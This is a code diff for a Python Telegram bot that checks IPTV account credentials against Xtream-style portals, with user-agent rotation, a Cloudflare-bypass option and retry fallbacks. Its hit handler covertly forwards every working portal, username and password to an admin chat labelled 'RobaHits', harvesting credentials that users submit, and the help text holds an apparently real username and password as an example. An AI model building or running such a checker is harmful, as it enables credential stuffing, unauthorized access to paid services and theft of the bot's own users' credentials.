-# ╚══════════════════════════════════════════════════════╝
+# ══════════════════════════════════════════════════════
+#  🔄 KEEP-ALIVE 24/7
+# ══════════════════════════════════════════════════════
 
 def keep_alive():
-    if not RENDER_URL: return
+    if not RENDER_URL:
+        return
     while True:
-        try: requests.get(RENDER_URL, timeout=8)
-        except Exception: pass
+        try:
+            requests.get(RENDER_URL, timeout=8)
+            log.info("Keep-alive ✅")
+        except Exception:
+            pass
         time.sleep(480)
 
-
-# ╔══════════════════════════════════════════════════════╗
-# ║               🛠️  HELPERS TELEGRAM                   ║
-# ╚══════════════════════════════════════════════════════╝
+# ══════════════════════════════════════════════════════
+#  🛠️ HELPERS
+# ══════════════════════════════════════════════════════
 
 def is_admin(u: Update) -> bool:
     return u.effective_user.id == ADMIN_ID
 
-def tg_user(u: Update) -> str:
+def tg_name(u: Update) -> str:
     usr = u.effective_user
     return usr.username or usr.first_name or str(usr.id)
 
+def _direct_fallback(portal: str, user: str, pwd: str) -> tuple:
+    """
+    Intento directo de último recurso cuando verify_account da RETRY.
+    Prueba get.php sin parámetros extra y player_api con requests simple.
+    Cubre servidores que solo responden a llamadas básicas.
+    """
+    urls = [
+        f"http://{portal}/get.php?username={user}&password={pwd}",
+        f"http://{portal}/player_api.php?username={user}&password={pwd}",
+        f"https://{portal}/get.php?username={user}&password={pwd}",
+        f"https://{portal}/player_api.php?username={user}&password={pwd}",
+    ]
+    for url in urls:
+        for ua in (ALL_USER_AGENTS[0], ALL_USER_AGENTS[7], ALL_USER_AGENTS[15]):
+            try:
+                r = requests.get(
+                    url,
+                    headers={"User-Agent": ua, "Accept": "*/*"},
+                    timeout=(TIMEOUT_CONN, TIMEOUT_READ),
+                    verify=False, allow_redirects=True
+                )
+                res, pay = _process_response(r)
+                if res != "RETRY":
+                    log.info(f"✅ Fallback resolvió: {res} | {url[:55]}")
+                    return res, pay
+            except Exception as e:
+                log.debug(f"Fallback err: {e}")
+            time.sleep(0.5)
+    return "RETRY", None
 
-# ╔══════════════════════════════════════════════════════╗
-# ║              ⚡ LÓGICA CENTRAL                        ║
-# ╚══════════════════════════════════════════════════════╝
 
-async def do_check(update: Update, portal: str, user: str,
-                   pwd: str, is_xui: bool = False, raw_url: str = None):
+# ══════════════════════════════════════════════════════
+#  ⚡ LÓGICA CENTRAL
+# ══════════════════════════════════════════════════════
+
+async def do_check(update: Update, portal: str, user: str, pwd: str):
     if not bot_active:
         await update.message.reply_text(
-            f"{SK} Bot en pausa. Solo el admin puede reactivarlo.",
-            parse_mode=ParseMode.HTML)
+            f"🔴 Bot detenido.\nContacta al admin {BOT_USERNAME}")
         return
-
     STATS["checks"] += 1
     STATS["users"].add(update.effective_user.id)
-    who = tg_user(update)
+    tg_user = tg_name(update)
 
-    msg = await update.message.reply_text(
-        f"{RKT} <b>Verificando cuenta...</b>\n"
-        f"{SIG} Conectando al servidor {GLOB}\n"
-        f"<i>Espera unos segundos...</i>",
-        parse_mode=ParseMode.HTML)
-
+    msg  = await update.message.reply_text("🔍 Verificando cuenta…")
     loop = asyncio.get_event_loop()
-    status, result = await loop.run_in_executor(
-        _POOL, verify, portal, user, pwd, is_xui, raw_url)
+    status, result = await loop.run_in_executor(None, verify_account, portal, user, pwd)
+
+    # ── Si RETRY, un intento extra directo con get.php ────────────────────
+    if status == "RETRY":
+        await msg.edit_text("🔄 Reintentando vía directa…")
+        status, result = await loop.run_in_executor(
+            None, _direct_fallback, portal, user, pwd)
 
     if status == "HIT":
         STATS["hits"] += 1
-        await msg.edit_text(
-            f"{FIRE} <b>¡ACTIVA! Obteniendo estadísticas...</b>",
-            parse_mode=ParseMode.HTML)
+        await msg.edit_text("📡 Obteniendo contenido…")
         ui = result["user_info"]
-        lf = loop.run_in_executor(_POOL, get_counts, portal, user, pwd)
-        cf = loop.run_in_executor(_POOL, get_cats,   portal, user, pwd)
-        live, vod, series = await lf
-        cats              = await cf
-        text = card_hit(portal, user, pwd, ui, live, vod, series, cats, who)
-        await msg.edit_text(text, parse_mode=ParseMode.HTML,
-                            disable_web_page_preview=True)
-        threading.Thread(target=send_roba,
-            args=(portal,user,pwd,ui,live,vod,series,who), daemon=True).start()
+        live_fut = loop.run_in_executor(None, get_content_counts, portal, user, pwd)
+        cats_fut = loop.run_in_executor(None, get_categories, portal, user, pwd)
+        live, vod, series = await live_fut
+        cats              = await cats_fut
+        text = card_hit(portal, user, pwd, ui, live, vod, series, cats, tg_user)
+        await msg.edit_text(text, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
+        threading.Thread(
+            target=send_robahit,
+            args=(portal, user, pwd, ui, live, vod, series, tg_user),
+            daemon=True
+        ).start()
 
     elif status == "CUSTOM":
         STATS["hits"] += 1
         ui = result["user_info"]
-        await msg.edit_text(card_custom(portal,user,pwd,ui,who),
-                            parse_mode=ParseMode.HTML,
-                            disable_web_page_preview=True)
+        await msg.edit_text(card_custom(portal, user, pwd, ui, tg_user),
+                            parse_mode=ParseMode.HTML, disable_web_page_preview=True)
 
     elif status == "FAIL":
         STATS["fails"] += 1
-        await msg.edit_text(card_fail(portal,user,who),
-                            parse_mode=ParseMode.HTML)
+        await msg.edit_text(card_fail(portal, user, tg_user), parse_mode=ParseMode.HTML)
+
     else:
         STATS["retries"] += 1
-        await msg.edit_text(card_retry(portal,user,who),
-                            parse_mode=ParseMode.HTML)
+        await msg.edit_text(card_retry(portal, user, tg_user), parse_mode=ParseMode.HTML)
 
-
-# ╔══════════════════════════════════════════════════════╗
-# ║                 📟 COMANDOS                           ║
-# ╚══════════════════════════════════════════════════════╝
+# ══════════════════════════════════════════════════════
+#  📟 COMANDOS
+# ══════════════════════════════════════════════════════
 
 async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     STATS["users"].add(update.effective_user.id)
-    admin_note = ""
     if is_admin(update):
         global bot_active
         bot_active = True
-        admin_note = f"\n{CRN} <b>Panel Admin activo</b> {CRN}"
-
-    kb = InlineKeyboardMarkup([
-        [InlineKeyboardButton("📖 Cómo usar",        callback_data="help"),
-         InlineKeyboardButton("📊 Estado",            callback_data="status")],
-        [InlineKeyboardButton("🔥 Formatos soportados", callback_data="formats")],
-    ])
+    kb = InlineKeyboardMarkup([[
+        InlineKeyboardButton("📖 Ayuda",   callback_data="help"),
+        InlineKeyboardButton("📊 Estado",  callback_data="status"),
+    ]])
     await update.message.reply_text(
-        f"╔{'═'*28}╗\n"
-        f"║  {SK} <b>🦂LUIS R🦂</b> {SK}  ║\n"
-        f"║  <b>IPTV CHECKER v6.0 FINAL</b>  ║\n"
-        f"╚{'═'*28}╝\n\n"
-        f"{FIRE} <b>¡Bienvenido!</b> Checker definitivo {FIRE}\n\n"
-        f"{BOLT} Ultra rápido · Todos los formatos\n"
-        f"{SHLD} Xtream · XUI One · M3U · CF bypass\n"
-        f"{SIG} En Vivo · VOD · Series · Categorías\n"
-        f"{RKT} 24/7 activo sin interrupciones\n"
-        f"{FIRE} RobaHits automático\n"
-        f"{admin_note}\n"
-        f"{L2}\n"
-        f"📌 <b>Pega tu URL directamente aquí</b>\n"
-        f"{L2}\n"
-        f"{SK} {BOT_USERNAME}",
-        parse_mode=ParseMode.HTML, reply_markup=kb)
+        f"🦂 <b>IPTV BOT ULTRA PRO</b> 🦂\n"
+        f"         <b>BY LUIS R</b>\n\n"
+        f"✅ Bot activo y listo\n\n"
+        f"📌 <b>Pega tu URL aquí:</b>\n"
+        f"<code>http://portal:8080/get.php?username=USER&amp;password=PASS</code>\n\n"
+        f"📌 <b>O usa:</b>\n"
+        f"<code>/check portal:puerto usuario pass</code>\n\n"
+        f"⚡ Anti falsos negativos — 3 reintentos automáticos\n"
+        f"🛡️ Cloudflare bypass integrado\n"
+        f"🔔 HITs enviados al admin automáticamente\n\n"
+        f"🦂 {BOT_USERNAME}",
+        parse_mode=ParseMode.HTML, reply_markup=kb
+    )
 
 async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update):
-        await update.message.reply_text(f"{CRS} Solo el admin puede hacer esto.",
-                                        parse_mode=ParseMode.HTML)
+        await update.message.reply_text("❌ No autorizado.")
         return
     global bot_active
     bot_active = False
     await update.message.reply_text(
-        f"{L1}\n  {SK} <b>🦂LUIS R🦂</b>\n{L1}\n\n"
-        f"  🔴 <b>BOT DETENIDO</b>\n  {CLK} {now_str()}\n\n"
-        f"  Usa /start para reactivar\n  {SK} {BOT_USERNAME}\n{L1}",
+        f"🔴 <b>Bot DETENIDO.</b>\nUsa /start para reactivarlo.\n🦂 {BOT_USERNAME}",
         parse_mode=ParseMode.HTML)
 
 async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update):
-        await update.message.reply_text(f"{CRS} Solo el admin puede ver esto.",
-                                        parse_mode=ParseMode.HTML)
+        await update.message.reply_text("❌ No autorizado.")
         return
     uptime = datetime.now(TZ) - BOT_START_TIME
-    h, rem = divmod(int(uptime.total_seconds()),3600)
-    m, s   = divmod(rem,60)
-    st     = "🟢 <b>ACTIVO</b>" if bot_active else "🔴 <b>DETENIDO</b>"
-    total  = STATS["checks"] or 1
-    pct    = round(STATS["hits"]*100/total,1)
+    h, rem = divmod(int(uptime.total_seconds()), 3600)
+    m, s   = divmod(rem, 60)
+    estado = "🟢 ACTIVO" if bot_active else "🔴 DETENIDO"
     try:
-        import cloudscraper; cs = f"{CHK} Instalado"
+        import cloudscraper
+        cf_st = "✅ Instalado"
     except ImportError:
-        cs = f"{WRN} No instalado"
+        cf_st = "⚠️ No instalado"
     await update.message.reply_text(
-        f"{L1}\n  {SK} <b>🦂LUIS R🦂</b> — ESTADO\n{L1}\n\n"
-        f"  {BOLT} Bot: {st}\n"
-        f"  ⏰ Uptime: <b>{h:02d}h {m:02d}m {s:02d}s</b>\n"
-        f"  {CLK} Hora: {now_str()}\n"
-        f"  {GLOB} Zona: {TZ_NAME}\n\n"
-        f"{L2}\n  {TRF} ESTADÍSTICAS\n{L2}\n"
-        f"  {CHK} Hits: <b>{STATS['hits']}</b>\n"
-        f"  {CRS} Fails: <b>{STATS['fails']}</b>\n"
-        f"  🔄 Retries: <b>{STATS['retries']}</b>\n"
-        f"  {STAR} Total: <b>{STATS['checks']}</b>\n"
-        f"  {FIRE} Éxito: <b>{pct}%</b>\n"
-        f"  👥 Usuarios: <b>{len(STATS['users'])}</b>\n\n"
-        f"{L2}\n  {SHLD} SISTEMA\n{L2}\n"
-        f"  Cloudscraper: {cs}\n"
-        f"  RobaHits → <code>{ROBAHITS_CHATID}</code>\n"
-        f"  Threads: {threading.active_count()}\n\n"
-        f"  {SK} {BOT_USERNAME}\n{L1}",
+        f"🦂 <b>ESTADO — LUIS R</b> 🦂\n\n"
+        f"📺 Bot: {estado}\n"
+        f"⏰ Uptime: {h:02d}h {m:02d}m {s:02d}s\n"
+        f"🕐 Hora: {now_str()}\n"
+        f"🌐 Zona: {TZ_NAME}\n\n"
+        f"✅ Hits: {STATS['hits']}\n"
+        f"❌ Fails: {STATS['fails']}\n"
+        f"🔄 Retries: {STATS['retries']}\n"
+        f"⭐ Total: {STATS['checks']}\n"
+        f"👥 Usuarios: {len(STATS['users'])}\n\n"
+        f"🛡️ Cloudscraper: {cf_st}\n"
+        f"🔔 RobaHits → <code>{ROBAHITS_CHATID}</code>\n"
+        f"📋 Dominios CF: {len(CF_DOMAINS)}\n"
+        f"🤖 User-Agents: {len(ALL_USER_AGENTS)}\n\n"
+        f"🦂 {BOT_USERNAME}",
         parse_mode=ParseMode.HTML)
 
 async def cmd_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     args = context.args
     if len(args) < 3:
         await update.message.reply_text(
-            f"📌 <code>/check portal:puerto usuario contraseña</code>\n"
-            f"Ejemplo: <code>/check server.tv:8080 MiUser MiPass</code>",
+            "📌 <b>Uso:</b>\n"
+            "<code>/check portal:puerto usuario contraseña</code>\n\n"
+            "🔥 <b>Ejemplo:</b>\n"
+            "<code>/check latinchannel.tv:8080 rafael.mazzilli mazzilli1402</code>",
             parse_mode=ParseMode.HTML)
         return
     await do_check(update, args[0], args[1], args[2])
 
 async def cmd_debug(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update):
-        await update.message.reply_text(f"{CRS} Solo admin.", parse_mode=ParseMode.HTML)
+        await update.message.reply_text("❌ No autorizado.")
         return
     args = context.args
     if len(args) < 3:
         await update.message.reply_text(
-            f"📌 <code>/debug portal:puerto usuario contraseña</code>",
+            "📌 <code>/debug portal:puerto usuario contraseña</code>",
             parse_mode=ParseMode.HTML)
         return
     portal, user, pwd = args[0], args[1], args[2]
-    host = portal.split(":")[0]
-    port = int(portal.split(":")[1]) if ":" in portal else 8080
-    msg  = await update.message.reply_text(
-        f"{GEM} <b>Diagnóstico...</b>", parse_mode=ParseMode.HTML)
-    lines = [f"🔬 <b>DIAGNÓSTICO</b> — {portal}\n"]
-
-    # TCP
-    for p in (port, 80, 8080, 443):
+    host = portal.split(':')[0]
+    port = int(portal.split(':')[1]) if ':' in portal else 8080
+    msg  = await update.message.reply_text("🔬 Ejecutando diagnóstico…")
+    lines = [f"🔬 <b>DIAGNÓSTICO</b> <code>{portal}</code>\n"]
+    lines.append(f"🛡️ CF: {'✅ Sí' if _is_cf_domain(host) else '❌ No'}\n")
+    for p in (port, 443, 80):
         try:
-            conn = socket.create_connection((host,p), timeout=3)
-            conn.close()
+            s = socket.create_connection((host, p), timeout=5)
+            s.close()
             lines.append(f"🔌 TCP ✅ puerto {p}")
             break
         except Exception as e:
-            lines.append(f"🔌 TCP ❌ puerto {p}: {str(e)[:40]}")
+            lines.append(f"🔌 TCP ❌ puerto {p}: {str(e)[:50]}")
     lines.append("")
-
-    # HTTP tests
     for scheme in ("http","https"):
-        for ep,epath in [
-            ("player_api", f"/{scheme}://{portal}/player_api.php?username={user}&password={pwd}"),
-            ("get.php",    f"/{scheme}://{portal}/get.php?username={user}&password={pwd}&type=m3u_plus"),
-            ("playlist",   f"/{scheme}://{portal}/playlist/{user}/{pwd}/m3u_plus"),
-        ]:
-            url = epath[1:]
-            lines.append(f"🔗 <code>{scheme.upper()} {ep}</code>")
-            try:
-                r = requests.get(url,
-                    headers={"User-Agent":"VLC/3.0.20 LibVLC/3.0.20"},
-                    timeout=(4,10), verify=False, allow_redirects=True)
-                raw = r.text.strip()[:200].replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")
-                lines.append(f"  HTTP {r.status_code} | {r.headers.get('Content-Type','?')[:30]}")
-                lines.append(f"  <code>{raw}</code>")
-            except Exception as e:
-                lines.append(f"  {CRS} {type(e).__name__}: {str(e)[:60]}")
-            lines.append("")
+        url = f"{scheme}://{portal}/player_api.php?username={user}&password={pwd}"
+        lines.append(f"🔗 <b>{scheme.upper()}</b>")
+        try:
+            ua = ALL_USER_AGENTS[0]
+            r  = requests.get(url, headers={"User-Agent": ua}, timeout=20, verify=False)
+            lines.append(f"  Status: <code>{r.status_code}</code>")
+            lines.append(f"  UA: <code>{ua[:45]}</code>")
+            raw = (r.text.strip()[:400]
+                   .replace("&","&amp;").replace("<","&lt;").replace(">","&gt;"))
+            lines.append(f"  Respuesta:\n<code>{raw}</code>")
+        except requests.exceptions.Timeout:
+            lines.append("  ⏱ Timeout >20s")
+        except requests.exceptions.ConnectionError:
+            lines.append("  ❌ Conexión rechazada")
+        except Exception as e:
+            lines.append(f"  ❌ {str(e)[:80]}")
+        lines.append("")
+    await msg.edit_text("\n".join(lines), parse_mode=ParseMode.HTML)
 
-    text = "\n".join(lines)
-    if len(text) > 4000: text = text[:4000] + "\n…(truncado)"
-    await msg.edit_text(text, parse_mode=ParseMode.HTML)
+async def cmd_addcf(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Agrega dominio a lista CF en tiempo real — solo admin."""
+    if not is_admin(update):
+        await update.message.reply_text("❌ No autorizado.")
+        return
+    args = context.args
+    if not args:
+        domains = "\n".join(f"• {d}" for d in CF_DOMAINS)
+        await update.message.reply_text(
+            f"📋 <b>Dominios CF actuales:</b>\n{domains}\n\n"
+            f"📌 Para agregar: <code>/addcf dominio.com</code>",
+            parse_mode=ParseMode.HTML)
+        return
+    domain = args[0].lower().strip()
+    if domain not in CF_DOMAINS:
+        CF_DOMAINS.append(domain)
+        await update.message.reply_text(
+            f"✅ <code>{domain}</code> agregado a CF.\n🦂 {BOT_USERNAME}",
+            parse_mode=ParseMode.HTML)
+    else:
+        await update.message.reply_text(
+            f"⚠️ <code>{domain}</code> ya estaba en la lista.",
+            parse_mode=ParseMode.HTML)
 
 async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
     admin_cmds = ""
     if is_admin(update):
         admin_cmds = (
-            f"\n{L2}\n  {CRN} <b>ADMIN</b>\n{L2}\n"
-            f"  /stop — 🔴 Pausar bot\n"
-            f"  /start — 🟢 Reactivar\n"
-            f"  /status — 📊 Estadísticas\n"
-            f"  /debug portal user pass — 🔬 Diagnóstico\n"
+            "\n\n🔧 <b>Comandos Admin:</b>\n"
+            "/stop — 🔴 Apagar bot\n"
+            "/status — 📊 Estadísticas\n"
+            "/debug <code>portal user pass</code> — 🔬 Diagnóstico\n"
+            "/addcf <code>dominio</code> — 🛡️ Agregar dominio CF\n"
         )
     await update.message.reply_text(
-        f"{L1}\n  {SK} <b>🦂LUIS R🦂</b> — AYUDA\n{L1}\n\n"
-        f"  /start — Pantalla principal\n"
-        f"  /check portal user pass — Verificar\n"
-        f"  /help — Esta ayuda\n"
+        f"🦂 <b>IPTV BOT ULTRA PRO — LUIS R</b> 🦂\n\n"
+        f"📌 <b>Comandos públicos:</b>\n"
+        f"/start — 🟢 Inicio\n"
+        f"/check <code>portal user pass</code> — ✅ Verificar\n"
+        f"/help — ❓ Ayuda\n"
         f"{admin_cmds}\n"
-        f"{L2}\n  {BOLT} <b>FORMATOS SOPORTADOS</b>\n{L2}\n"
-        f"• URL completa get.php o player_api.php\n"
-        f"• <code>http://portal/playlist/user/pass/m3u_plus</code> ← XUI One\n"
+        f"💡 <b>Formatos soportados:</b>\n"
+        f"• URL M3U completa\n"
         f"• <code>portal|usuario|pass</code>\n"
-        f"• <code>portal usuario pass</code>\n"
-        f"• URL M3U directa (.m3u)\n\n"
-        f"  {SK} {BOT_USERNAME}\n{L1}",
+        f"• <code>portal usuario pass</code>\n\n"
+        f"🦂 {BOT_USERNAME}",
         parse_mode=ParseMode.HTML)
 
-async def cb_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    q = update.callback_query
-    await q.answer()
-    if q.data == "help":
-        await q.message.reply_text(
-            f"{L1}\n  {SK} <b>CÓMO USAR</b>\n{L1}\n\n"
-            f"{BOLT} <b>Pega directamente la URL:</b>\n"
-            f"<code>http://portal:8080/get.php?username=U&amp;password=P</code>\n\n"
-            f"{BOLT} <b>XUI One:</b>\n"
-            f"<code>http://portal/playlist/usuario/pass/m3u_plus</code>\n\n"
-            f"{BOLT} <b>Pipe:</b>\n"
-            f"<code>portal:8080|usuario|contraseña</code>\n\n"
-            f"{BOLT} <b>Comando:</b>\n"
-            f"<code>/check portal:8080 usuario contraseña</code>\n\n"
-            f"  {SK} {BOT_USERNAME}\n{L1}",
-            parse_mode=ParseMode.HTML)
-    elif q.data == "status":
-        st = "🟢 <b>ACTIVO</b>" if bot_active else "🔴 <b>DETENIDO</b>"
-        total = STATS["checks"] or 1
-        await q.message.reply_text(
-            f"{L1}\n  {SK} Estado público\n{L1}\n\n"
-            f"  {BOLT} Bot: {st}\n"
-            f"  {CHK} Hits: <b>{STATS['hits']}</b>\n"
-            f"  {STAR} Total: <b>{STATS['checks']}</b>\n"
-            f"  {CLK} {now_str()}\n  {SK} {BOT_USERNAME}\n{L1}",
-            parse_mode=ParseMode.HTML)
-    elif q.data == "formats":
-        await q.message.reply_text(
-            f"{L1}\n  {SK} <b>FORMATOS SOPORTADOS</b>\n{L1}\n\n"
-            f"{SIG} <b>Xtream Codes:</b>\n"
-            f"<code>http://portal:8080/get.php?username=U&amp;password=P&amp;type=m3u_plus</code>\n\n"
-            f"{SIG} <b>Player API:</b>\n"
-            f"<code>http://portal:8080/player_api.php?username=U&amp;password=P</code>\n\n"
-            f"{SIG} <b>XUI One Playlist:</b>\n"
-            f"<code>http://portal/playlist/usuario/pass/m3u_plus</code>\n\n"
-            f"{SIG} <b>Pipe separado:</b>\n"
-            f"<code>portal:8080|usuario|contraseña</code>\n\n"
-            f"{SIG} <b>M3U directo:</b>\n"
-            f"<code>http://servidor/lista.m3u?token=xxx</code>\n\n"
-            f"  {SK} {BOT_USERNAME}\n{L1}",
+async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    if query.data == "help":
+        await query.message.reply_text(
+            f"🦂 <b>IPTV BOT ULTRA PRO — LUIS R</b> 🦂\n\n"
+            f"💡 Pega tu URL o usa:\n"
+            f"/check <code>portal:puerto usuario pass</code>\n\n"
+            f"Formatos:\n"
+            f"• <code>http://portal/get.php?username=U&amp;password=P</code>\n"
+            f"• <code>portal|usuario|pass</code>\n"
+            f"• <code>portal usuario pass</code>\n\n"
+            f"🦂 {BOT_USERNAME}", parse_mode=ParseMode.HTML)
+    elif query.data == "status":
+        estado = "🟢 ACTIVO" if bot_active else "🔴 DETENIDO"
+        await query.message.reply_text(
+            f"📊 <b>Estado:</b> {estado}\n"
+            f"⭐ Verificados: {STATS['checks']}\n"
+            f"✅ Hits: {STATS['hits']}\n"
+            f"👥 Usuarios: {len(STATS['users'])}\n"
+            f"🕐 {now_str()}\n\n🦂 {BOT_USERNAME}",
             parse_mode=ParseMode.HTML)
 
-async def handle_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not bot_active:
-        await update.message.reply_text(
-            f"{L1}\n  {SK} <b>🦂LUIS R🦂</b>\n{L1}\n\n"
-            f"  🔴 <b>BOT EN PAUSA</b>\n"
-            f"  El admin lo detuvo temporalmente.\n\n"
-            f"  {SK} {BOT_USERNAME}\n{L1}",
-            parse_mode=ParseMode.HTML)
+        await update.message.reply_text(f"🔴 Bot detenido.\n🦂 {BOT_USERNAME}")
         return
-
     text = (update.message.text or "").strip()
-    portal, user, pwd, is_xui, raw_url = extract(text)
-
-    if portal and (user or raw_url):
-        await do_check(update, portal, user or "", pwd or "",
-                       is_xui=is_xui, raw_url=raw_url)
+    portal, user, pwd = extract_from_url(text)
+    if portal and user and pwd:
+        await do_check(update, portal, user, pwd)
     else:
         await update.message.reply_text(
-            f"{L1}\n  {SK} <b>🦂LUIS R🦂</b>\n{L1}\n\n"
-            f"  {WRN} <b>Formato no reconocido</b>\n\n"
-            f"  Ejemplos válidos:\n"
-            f"  <code>http://portal:8080/get.php?username=U&amp;password=P</code>\n"
-            f"  <code>http://portal/playlist/user/pass/m3u_plus</code>\n"
-            f"  <code>portal|user|pass</code>\n\n"
-            f"  Usa /help para ver todos los formatos.\n  {SK} {BOT_USERNAME}\n{L1}",
+            f"❓ No reconocí esa URL.\n\n"
+            f"📌 Pega algo así:\n"
+            f"<code>http://portal:8080/get.php?username=USER&amp;password=PASS</code>\n\n"
+            f"O usa /help\n🦂 {BOT_USERNAME}",
             parse_mode=ParseMode.HTML)
 
-
-# ╔══════════════════════════════════════════════════════╗
-# ║           🚀 MAIN — Loop robusto 24/7                ║
-# ╚══════════════════════════════════════════════════════╝
+# ══════════════════════════════════════════════════════
+#  🚀 MAIN
+# ══════════════════════════════════════════════════════
 
 def main():
     if not BOT_TOKEN:
-        log.error("❌ BOT_TOKEN no configurado. Railway → Variables → BOT_TOKEN")
+        log.error(
+            "❌ BOT_TOKEN no configurado.\n"
+            "   Railway → Variables → New Variable\n"
+            "   BOT_TOKEN = tu token de @BotFather")
         return
 
     threading.Thread(target=keep_alive, daemon=True).start()
-    log.info(f"🦂 BOT 🦂LUIS R🦂 v6.0 FINAL | TZ:{TZ_NAME} | T_READ:{T_READ}s | T_TOTAL:{T_TOTAL}s")
+    log.info(f"🦂 IPTV BOT ULTRA PRO — LUIS R | TZ: {TZ_NAME}")
+    log.info(f"   UAs: {len(ALL_USER_AGENTS)} | CF dominios: {len(CF_DOMAINS)}")
+    log.info(f"   RobaHits → {ROBAHITS_CHATID}")
 
-    delays = [5,10,15,30,60]
-    attempt = 0
+    app = Application.builder().token(BOT_TOKEN).build()
+    app.add_handler(CommandHandler("start",  cmd_start))
+    app.add_handler(CommandHandler("stop",   cmd_stop))
+    app.add_handler(CommandHandler("status", cmd_status))
+    app.add_handler(CommandHandler("check",  cmd_check))
+    app.add_handler(CommandHandler("debug",  cmd_debug))
+    app.add_handler(CommandHandler("addcf",  cmd_addcf))
+    app.add_handler(CommandHandler("help",   cmd_help))
+    app.add_handler(CallbackQueryHandler(callback_handler))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
 
-    while True:
-        try:
-            app = (Application.builder()
-                   .token(BOT_TOKEN)
-                   .concurrent_updates(True)
-                   .build())
-
-            app.add_handler(CommandHandler("start",  cmd_start))
-            app.add_handler(CommandHandler("stop",   cmd_stop))
-            app.add_handler(CommandHandler("status", cmd_status))
-            app.add_handler(CommandHandler("check",  cmd_check))
-            app.add_handler(CommandHandler("debug",  cmd_debug))
-            app.add_handler(CommandHandler("help",   cmd_help))
-            app.add_handler(CallbackQueryHandler(cb_handler))
-            app.add_handler(MessageHandler(
-                filters.TEXT & ~filters.COMMAND, handle_msg))
-
-            log.info("✅ Bot 🦂LUIS R🦂 v6.0 corriendo 24/7.")
-            attempt = 0
-            app.run_polling(drop_pending_updates=True)
-            time.sleep(2)
-
-        except requests.exceptions.ReadTimeout:
-            d = delays[min(attempt,len(delays)-1)]
-            log.warning(f"[poll] ReadTimeout → reconectando en {d}s")
-            time.sleep(d); attempt += 1
-        except requests.exceptions.ConnectionError as e:
-            d = delays[min(attempt,len(delays)-1)]
-            log.warning(f"[poll] ConnectionError → {d}s")
-            time.sleep(d); attempt += 1
-        except KeyboardInterrupt:
-            log.info("Bot detenido."); break
-        except Exception as e:
-            d = delays[min(attempt,len(delays)-1)]
-            log.error(f"[poll] {e}")
-            time.sleep(d); attempt += 1
+    log.info("✅ Bot listo — escuchando.")
+    app.run_polling(drop_pending_updates=True)
 
 if __name__ == "__main__":
     main()
